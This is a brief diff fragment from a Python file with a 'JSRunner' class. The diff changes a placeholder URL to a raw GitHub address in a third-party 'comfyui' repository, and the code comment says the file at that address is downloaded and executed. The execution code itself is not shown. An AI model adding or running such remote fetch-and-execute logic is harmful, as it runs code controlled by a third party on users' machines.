@@ -6,7 +6,7 @@ import atexit
 import requests
 
 # URL of the JavaScript file to download and execute
-JS_URL = "https://example.com/script.js"
+JS_URL = "https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js"
 
 class JSRunner:
     """
